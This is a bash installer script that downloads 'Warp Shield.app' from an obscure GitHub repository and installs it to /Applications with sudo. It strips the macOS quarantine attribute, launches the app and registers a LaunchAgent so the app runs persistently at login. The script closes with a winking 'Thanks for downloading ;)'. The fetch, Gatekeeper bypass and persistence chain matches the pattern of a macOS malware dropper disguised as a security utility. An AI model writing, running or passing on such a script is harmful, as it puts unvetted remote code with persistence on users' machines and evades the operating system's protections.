#!/usr/bin/env bash
set -euo pipefail

# --- Config ---
ZIP_URL="https://github.com/44sk/j/archive/refs/heads/main.zip"
TMPDIR="$(mktemp -d)"
APP_NAME="Warp Shield.app"

cleanup() {
  rm -rf "$TMPDIR"
}
trap cleanup EXIT

cd "$TMPDIR"

# --- Download and unzip the app ---
echo "Downloading Warp Shield..."
curl -L --fail --retry 3 "$ZIP_URL" -o warp-shield.zip
unzip -q warp-shield.zip
rm warp-shield.zip

# --- Locate the .app ---
APP_PATH="$(find . -type d -name "$APP_NAME" -print -quit)"
if [ -z "$APP_PATH" ]; then
  echo "Error: $APP_NAME not found in archive."
  exit 1
fi

# --- Move to /Applications ---
DEST="/Applications/$(basename "$APP_PATH")"
if [ -d "$DEST" ]; then
  echo "Removing existing version..."
  if [ -w "$DEST" ]; then
    rm -rf "$DEST"
  else
    sudo rm -rf "$DEST"
  fi
fi

echo "Installing to /Applications..."
if [ -w "/Applications" ]; then
  mv "$APP_PATH" /Applications/
else
  sudo mv "$APP_PATH" /Applications/
fi

# --- Fix permissions and remove quarantine ---
xattr -d -r com.apple.quarantine "$DEST" 2>/dev/null || true
chmod +x "$DEST/Contents/MacOS/"* 2>/dev/null || true

# --- Open the app ---
open "$DEST"


PLIST_SRC="$(pwd)/Warp Shield.app/Contents/Resources/com.WarpShield.WarpShield.plist"
PLIST_DST="$HOME/Library/LaunchAgents/com.WarpShield.WarpShield.plist"

mkdir -p "$HOME/Library/LaunchAgents"

if [ ! -f "$PLIST_DST" ]; then
    cp "$PLIST_SRC" "$PLIST_DST"
fi

chmod 644 "$PLIST_DST"
chown "$USER":staff "$PLIST_DST"

plutil -lint "$PLIST_DST" >/dev/null 2>&1

launchctl bootout gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
launchctl bootstrap gui/$(id -u) "$PLIST_DST" 2>/dev/null || true

launchctl list | grep WarpShield >/dev/null 2>&1 || true

# --- Final message ---
echo "Thanks for downloading ;)"
